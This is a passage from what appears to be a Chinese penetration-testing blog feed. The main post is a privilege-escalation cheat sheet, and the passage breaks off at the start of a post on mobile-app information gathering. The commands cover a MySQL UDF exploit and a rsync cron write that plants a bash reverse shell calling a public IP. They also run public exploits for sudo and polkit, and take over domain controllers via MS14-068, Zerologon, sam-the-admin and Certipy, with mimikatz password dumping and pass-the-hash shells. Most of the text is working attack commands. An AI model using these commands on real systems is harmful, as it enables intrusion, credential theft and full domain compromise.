https://xx.xx.xx.xx/1518.so</span><br></pre></td></tr></table></figure>\n<ul>\n<li>mysql udf 提权</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入数据库进行UDF导出：</span></span><br><span class=\"line\">use mysql;</span><br><span class=\"line\">create table foo(line blob);</span><br><span class=\"line\">insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;));</span><br><span class=\"line\">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建do_system函数调用：</span></span><br><span class=\"line\">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class=\"line\">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">配合使用find调用执行：</span></span><br><span class=\"line\">touch xiaodi</span><br><span class=\"line\">find xiaodi –exec &quot;whoami&quot; \\;</span><br><span class=\"line\">find xiaodi –exec &quot;/bin/sh&quot; \\;</span><br><span class=\"line\">id</span><br></pre></td></tr></table></figure>\n<ul>\n<li>mysql 允许外联</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY&#x27;R@v3nSecurity&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">flush privileges;</span><br><span class=\"line\">允许 root 外连若还是无法连接，则可能是防火墙的阻止，可利用 webshell工具将端口穿透出来。</span><br></pre></td></tr></table></figure>\n<h4 id=\"mdut-数据库提权\"><a class=\"markdownIt-Anchor\" href=\"#mdut-数据库提权\">#</a> mdut 数据库提权</h4>\n<p>MDUT 2.0 数据库利用工具：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NhZmVHcm9jZXJ5U3RvcmUvTURVVA==\">https://github.com/SafeGroceryStore/MDUT</span></p>\n<p>java8 -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar</p>\n<p>综合漏洞利用 (包含各数据库) <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xpcXVua2l0L0xpcXVuS2l0Xw==\">https://github.com/Liqunkit/LiqunKit_</span> LiqunKit</p>\n<p>mssql 利用工具：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1NoYXJwU1FMVG9vbHM=\">https://github.com/uknowsec/SharpSQLTools</span> SharpSQLTools</p>\n<p>通过套接字重用通过受损的 Microsoft SQL Server 在受限环境中执行横向移动 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JsYWNrYXJyb3dzZWMvbXNzcWxwcm94eQ==\">https://github.com/blackarrowsec/mssqlproxy</span> mssqlproxy</p>\n<p>ODAT：Oracle 数据库攻击工具 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3F1ZW50aW5oYXJkeS9vZGF0\">https://github.com/quentinhardy/odat</span> ODAT</p>\n<h4 id=\"rsync-未授权\"><a class=\"markdownIt-Anchor\" href=\"#rsync-未授权\">#</a> rsync 未授权</h4>\n<p>Rsync 是 linux 下一款数据备份工具，默认开启 873 端口，借助 Linux 默认计划任务调用 /etc/cron.hourly，利用 rsync 连接覆盖。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建一个nc文件，内容如下：</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">/bin/bash -i &gt;&amp; /dev/tcp/47.94.236.117/3333 0&gt;&amp;i</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">赋予执行权限</span></span><br><span class=\"line\">chmod +x nc</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上传文件覆盖定时任务目录下：</span></span><br><span class=\"line\">rsync -av nc rsync://47.94.236.117:873/src/etc/cron.hourly</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载文件</span></span><br><span class=\"line\">rsync -av rsync://47.94.236.117:873/src/etc/passwd ./</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进行nc 监听相应的端口</span></span><br><span class=\"line\">nc -lvnp 3333</span><br></pre></td></tr></table></figure>\n<h4 id=\"docker-组挂载\"><a class=\"markdownIt-Anchor\" href=\"#docker-组挂载\">#</a> docker 组挂载</h4>\n<p>普通用户在 docker 组，利用 docker 服务启动镜像挂载目录，从而来访问 root 目录、etc 目录等敏感文件来进行权限提升。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建用户归类目录，添加到docker组</span></span><br><span class=\"line\">useradd -d /home/test -m test</span><br><span class=\"line\">passwd test</span><br><span class=\"line\">usermod -G docker test</span><br><span class=\"line\">newgrp docker</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从Docker上面下载alpine镜像，然后运行，-v将容器外部的目录/root挂载到容器内部/mnt，使用-it参数进入容器shell。</span></span><br><span class=\"line\">docker run -v /root:/mnt -it alpine</span><br></pre></td></tr></table></figure>\n<h4 id=\"sudo-提权\"><a class=\"markdownIt-Anchor\" href=\"#sudo-提权\">#</a> sudo 提权</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">sudo: 版本在1.8.2-1.8.31p2 或者 1.0-1.5p1</span></span><br><span class=\"line\">git clone https://github.com/blasty/CVE-2021-3156.git</span><br><span class=\"line\">cd CVE-2021-3156</span><br><span class=\"line\">make &amp;&amp; chmod a+x sudo-hax-me-a-sandwich</span><br><span class=\"line\">./sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></figure>\n<h4 id=\"polkit-漏洞\"><a class=\"markdownIt-Anchor\" href=\"#polkit-漏洞\">#</a> polkit 漏洞</h4>\n<p>漏洞影响 2009 年 5 月至今的所有 polkit 版本，由于 polkit 是系统预装工具，所有存在 polkit 的 linux 系统均受影响，只要存在 polkit 且没有打补丁就可以提权。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">判断是否存在</span></span><br><span class=\"line\">dpkg -l policykit-1 </span><br><span class=\"line\">rpm -q policykit-1 </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">漏洞利用</span></span><br><span class=\"line\">git clone https://github.com/berdav/CVE-2021-4034.git</span><br><span class=\"line\">cd CVE-2021-4034/</span><br><span class=\"line\">make &amp;&amp; ./cve-2021-4034</span><br></pre></td></tr></table></figure>\n<h3 id=\"域控提权\"><a class=\"markdownIt-Anchor\" href=\"#域控提权\">#</a> 域控提权</h3>\n<h4 id=\"cve-2014-6324\"><a class=\"markdownIt-Anchor\" href=\"#cve-2014-6324\">#</a> CVE-2014-6324</h4>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmVpemlhbnF1YW4vcC8xMTc2MDU2NC5odG1s\">https://www.cnblogs.com/feizianquan/p/11760564.html</span></p>\n<ul>\n<li>前提条件</li>\n</ul>\n<p>需要域用户账号密码 + 一台主机的管理员权限 + 域控没有打 MS14-068 的补丁 (KB3011780)</p>\n<ul>\n<li>工具下载</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Ms14-068.exe:</span></span><br><span class=\"line\">https://github.com/abatchy17/WindowsExploits/tree/master/MS14- 068</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">PSexec:</span></span><br><span class=\"line\">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">mimikatz:</span></span><br><span class=\"line\">https://github.com/gentilkiwi/mimikatz/releases</span><br></pre></td></tr></table></figure>\n<ul>\n<li>漏洞利用</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 如果当前用户为域用户</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">得到域成员用户名和 sid 号</span></span><br><span class=\"line\">whoami /user </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">指定要同步时钟的域，可以查看域名称</span></span><br><span class=\"line\">net time /domain </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 如果当前用户是普通用户，利用管理员身份启动 mimikatz 利用下列命令获取域用户 sid 和域控主机名</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">权限提升</span> </span><br><span class=\"line\">privilege::debug </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">抓取密码</span></span><br><span class=\"line\">sekurlsa::logonPasswords </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c. 利用 ms14-068.exe 工具生成伪造的 kerberos 协议认证证书</span></span><br><span class=\"line\">ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器 地址</span><br><span class=\"line\">ms14-068.exe -u mary@god.org -p admin!@#45 -s S-1-5-21-1218902331- 2157346161-1782232778-1124 -d OWA2010CN-God.god.org</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">d. 利用 mimikatz.exe 将证书写入，从而提升为域管理员</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">清除当前会话</span></span><br><span class=\"line\">kerberos::purge </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导入由 ms14-068.exe 生成的证书 名字</span></span><br><span class=\"line\">kerberos::ptc &quot;TGT_test02@test.lab.ccache&quot; </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看与域控是否建立了联系</span></span><br><span class=\"line\">kerberos::list </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">e. 连接域控，获取域控的 shell</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">测试连接是否成功</span></span><br><span class=\"line\">dir \\\\OWA2010CN-God.god.org\\C$ </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用 PsExec.exe 以管理员权限运行连接域控</span></span><br><span class=\"line\">psexec \\\\OWA2010CN-God.god.org cmd </span><br></pre></td></tr></table></figure>\n<h4 id=\"cve-2020-1472\"><a class=\"markdownIt-Anchor\" href=\"#cve-2020-1472\">#</a> CVE-2020-1472</h4>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xODM3NDgz\">https://cloud.tencent.com/developer/article/1837483</span></p>\n<ul>\n<li>前提条件</li>\n</ul>\n<p>CVE-2020-1472 是继 MS17010 之后好用的 NetLogon 特权域控提权漏洞， 只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞。该漏洞不要求当前计算机在域内，也不要求当前计算机操作系统为 Windows.</p>\n<ul>\n<li>工具下载</li>\n</ul>\n<p>下载 poc:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyYUJWL0NWRS0yMDIwLTE0NzI=\">https://github.com/SecuraBV/CVE-2020-1472</span><br>\n 下载 exp:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0NWRS0yMDIwLTE0NzI=\">https://github.com/dirkjanm/CVE-2020-1472</span></p>\n<ul>\n<li>漏洞利用</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 获取目标计算机名，进行漏洞检测</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取目标计算机名</span></span><br><span class=\"line\">nbtscan -v -h 192.168.3.21</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">验证漏洞是否存在</span></span><br><span class=\"line\">python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 重置DC密码，获取<span class=\"built_in\">hash</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重置 DC 密码：</span></span><br><span class=\"line\">python3 cve- 2020 - 1472 - exploit.py OWA2010CN-GOD 192.168.3.21</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用impacket包中的secretsdum.py来获取相关的HASH:</span></span><br><span class=\"line\">python3 secretsdump.py god.org/OWA2010CN-GOD\\$@192.168.3.21 -no-pass</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c. 通过wmicexec.py使用<span class=\"built_in\">hash</span>获取DC的shell</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取HASH后，可以利用wmiexec.py登录，从而获取一个shell</span></span><br><span class=\"line\">python wmiexec.py -hashes &lt;HASH&gt; DOMAIN/DOMAIN_USER@DC_ipaddr</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">wmi连接反弹</span></span><br><span class=\"line\">python3 wmiexec.py god/administrator@192.168.3.21 -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>\n<h4 id=\"cve-2021-42287\"><a class=\"markdownIt-Anchor\" href=\"#cve-2021-42287\">#</a> CVE-2021-42287</h4>\n<p>参考地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXcucXEuY29tL3JhaW4vYS8yMDIxMTIxN2EwYnJtZjAw\">https://new.qq.com/rain/a/20211217a0brmf00</span></p>\n<ul>\n<li>前提条件</li>\n</ul>\n<p>一个普通域成员帐户 + 域用户有创建机器用户的权限（一般默认权限）+ DC 未打补丁 KB5008380 或 KB5008602。</p>\n<ul>\n<li>工具下载</li>\n</ul>\n<p>sam_the_admin.py: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhemVIZWxsL3NhbS10aGUtYWRtaW4=\">https://github.com/WazeHell/sam-the-admin</span></p>\n<ul>\n<li>漏洞利用</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从域外环境已知域内一个普通用户密码直接拿DC shell或者域内所有<span class=\"built_in\">hash</span></span></span><br><span class=\"line\">python3 sam_the_admin.py god/&#x27;mary:admin!@#45&#x27; -dc-ip 192.168.3.21 -shell</span><br></pre></td></tr></table></figure>\n<h4 id=\"cve-2022-26923\"><a class=\"markdownIt-Anchor\" href=\"#cve-2022-26923\">#</a> CVE-2022-26923</h4>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8zMzU0NzEuaHRtbA==\">https://www.freebuf.com/vuls/335471.html</span></p>\n<ul>\n<li>前提条件</li>\n</ul>\n<p>一个域内普通账号 + 域内存在证书服务器</p>\n<ul>\n<li>工具下载</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweQ==\">https://github.com/ly4k/Certipy</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NyYXZhdGVSb3VnZS9ibG9vZHlBRA==\">https://github.com/CravateRouge/bloodyAD</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0\">https://github.com/SecureAuthCorp/impacket</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL1BLSU5JVHRvb2xz\">https://github.com/dirkjanm/PKINITtools</span></p>\n<ul>\n<li>漏洞利用</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 首先需要获取域控服务器，域证书服务器的一些基本信息</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在受控的主机上执行powershell命令</span></span><br><span class=\"line\">Get-ChildItem Cert:\\LocalMachine\\Root\\</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">得到域证书服务器地址fenghuotai-DC-CA，</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">域控服务器地址fenghuotai.local，域控计算机名为dc</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 设置攻击机的DNS服务器地址为域控DNS服务器地址</span></span><br><span class=\"line\">192.168.1.15 fenghuotai.local dc.fenghuotai.local fenghuotai-DC-CA</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c. 使用掌握的域内普通用户账号申请证书并验证登录，测试复现环境是否异常</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">申请证书 可能会遇到NETBIOS超时现象，重新执行一次申请证书命令即可</span></span><br><span class=\"line\">certipy req &#x27;fenghuotai.local/testcve:1qaz3edc.@dc.fenghuotai.local&#x27; -ca fenghuotai-DC-CA -template User</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">验证该证书，获取其NT <span class=\"built_in\">hash</span></span></span><br><span class=\"line\">certipy auth -pfx testcve.pfx</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">d. 新建账号pwnmachine，配置DNShostname，并申请域控dc$的证书</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新建一台名为pwnmachine，密码为CVEPassword1234*的机器账号：</span></span><br><span class=\"line\">python bloodyAD.py -d fenghuotai.local -u testcve -p &#x27;1qaz3edc.&#x27; --host 192.168.220.160 addComputer pwnmachine &#x27;CVEPassword1234*&#x27;，</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置其dNSHostName 属性为域控服务器属性：</span></span><br><span class=\"line\">python bloodyAD.py -d fenghuotai.local -u testcve -p &#x27;1qaz3edc.&#x27; --host 192.168.220.160 setAttribute &#x27;CN=pwnmachine,CN=Computers,DC=fenghuotai, DC=local&#x27; dNSHostName &#x27;[&quot;dc.fenghuotai.local&quot;]&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">申请新建的机器账号pwnmachine$的证书，其实申请到的是域控dc$的证书：</span></span><br><span class=\"line\">certipy req &#x27;fenghuotai.local/pwnmachine$:CVEPassword1234*@192.168.220.160&#x27; -template Machine -dc-ip 192.168.220.160 -ca fenghuotai-DC-CA</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进行登录验证，获取其NT <span class=\"built_in\">hash</span>:</span></span><br><span class=\"line\">certipy auth -pfx ./dc.pfx -dc-ip 192.168.220.160</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">e. 获取域内所有账户<span class=\"built_in\">hash</span>，通过<span class=\"built_in\">hash</span>获取shell</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用impacket工具examples目录下的secretsdump.py脚本：</span></span><br><span class=\"line\">python3 secretsdump.py &#x27;fenghuotai.local/dc$@dc.fenghuotai.local&#x27; -hashes :xxx</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过<span class=\"built_in\">hash</span>获取到域控的shell</span></span><br><span class=\"line\">python3 wmiexec.py fenghuotai.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">还可以使用PKINITtools工具，获取域控最高权限shell</span></span><br></pre></td></tr></table></figure>",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/5%20APP%E6%94%BB%E9%98%B2/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/5%20APP%E6%94%BB%E9%98%B2/",
            "title": "XD22 5 APP 攻防",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"app-信息收集\"><a class=\"markdownIt-Anchor\" href=\"#app-信息收集\">#</a> APP 信息收集</h3>\n<p>有很多小工具就可以完成部分信息收集，但是信息收集不完整</p>\n<p>APK Messenger - 基本信息、资源文件与开启权限等，可以提取到此 apk 中的<br>\n图片资源，xml 资源，其他数据等。</p>\n<h4 id=\"appinfoscanner采集\"><a class=\"markdownIt-Anchor\" href=\"#appinfoscanner采集\">#</a> AppInfoScanner 采集</h4>\n<p>一款适用于以 HW 行动 / 红队 / 渗透测试团队为场景的移动端 (Android、iOS、 WEB、H5、静态网站) 信息收集扫描工具，可以帮助渗透测试工程师、攻击队 成员、红队成员快速收集到移动端或者静态 WEB 站点中关键的资产信息并提供 基本的信息输出，如：Title、Domain、CDN、指纹信息、状态信息等。</p>\n<p>AppInfoScanner 使用方法：提取是从 apk 自身代码中进行提取的，另外还可以直接通过抓包的方法来提取信息，通过配置模拟器代理，流量监听之 burp 的方法是从访问接口进行提取的，两种方法在实际测试汇总都要使用。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/kelvinBen/AppInfoScanner</span></span><br><span class=\"line\">python app.py android -i &lt;Your APK File or DEX File or APK Download Url &gt;</span><br><span class=\"line\">python app.py ios -i &lt;Your IPA file or Mach-o File or IPA Download Url or Save File Dir&gt;</span><br><span class=\"line\">python app.py web -i &lt;Your Web file or Save Web Dir or Web Cache Url&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"mobsf-移动安全\"><a class=\"markdownIt-Anchor\" href=\"#mobsf-移动安全\">#</a> MobSF 移动安全</h4>\n<p>一种自动化的一体化移动应用程序 (Android/iOS/Windows) 渗透测试、恶 意软件分析和安全评估框架，能够执行静态和动态分析。MobSF 支持移动应用 程序二进制文件 